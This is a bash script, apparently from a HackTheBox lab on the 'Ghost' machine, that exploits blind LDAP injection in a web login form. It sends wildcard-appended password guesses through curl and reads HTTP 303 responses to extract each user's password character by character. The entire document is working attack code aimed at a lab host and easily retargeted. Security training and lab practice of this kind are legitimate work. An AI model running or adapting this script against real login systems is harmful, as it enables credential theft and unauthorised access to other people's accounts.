#! /usr/bin/env bash

# Inspired by my initial endeavors into LDAP injection here: 
#     https://benheater.com/hackthebox-analysis/#testing-blind-ldap-injection

# Use these word lists and filter out LDAP bad characters
chars=$(cat /usr/share/seclists/Fuzzing/alphanum-case.txt /usr/share/seclists/Fuzzing/special-chars.txt | grep -vE '\*|\(|\)|\\')
users=$(cat /home/ben/Pentest/Training/HackTheBox/MachineLabs/Ghost/users.txt)

# Keeping the code DRY
function send_curl() {
    username=$1
    testChar=$2 # Store user input
    url="http://intranet.ghost.htb:8008/login"
    proxy="http://127.0.0.1:8080"
    # Form fields and headers observed through test logins via Burp
    ldapUsernameField="1_ldap-username=${username}"
    ldapSecretField="1_ldap-secret=${testChar}"
    outputFormField='0=[{},"$K1"]'
    nextActionHeader='Next-Action: c471eb076ccac91d6f828b671795550fd5925940'

    # Proxying requests through Burp for inspection
    curl -si "$url" -x "$proxy" \
    -H "$nextActionHeader" \
    -F "$ldapUsernameField" \
    -F "$ldapSecretField" \
    -F "$outputFormField"
}

for username in $users ; do

    password=''
    passwordFound='False'
    matchFound='False'
    exhausted='False'

    while [ "$passwordFound" == "False" ] && [ "$exhausted" == "False" ] ; do

        # Test current state of the password at the top of the loop and break the loop if the password works
        echo "${username}:${password}"
        send_curl $username $password | grep 303 > /dev/null && passwordFound='True'

        # Loop over the current character set first without an asterisk
        for char in $chars ; do
            testChar="${password}${char}*"
            send_curl "$username" "$testChar" | grep 303 > /dev/null && matchFound='True' && password="${password}${char}" && break || matchFound='False'
        done

        # We didn't find a match, so assume the next character is an asterisk
        if [ "$matchFound" == "False" ] ; then
            for char in $chars ; do
                testChar="${password}*${char}*"
                send_curl "$username" "$testChar" | grep 303 > /dev/null && matchFound='True' && password="${password}${char}" && break || exhausted='True'
            done
        fi

    done

done
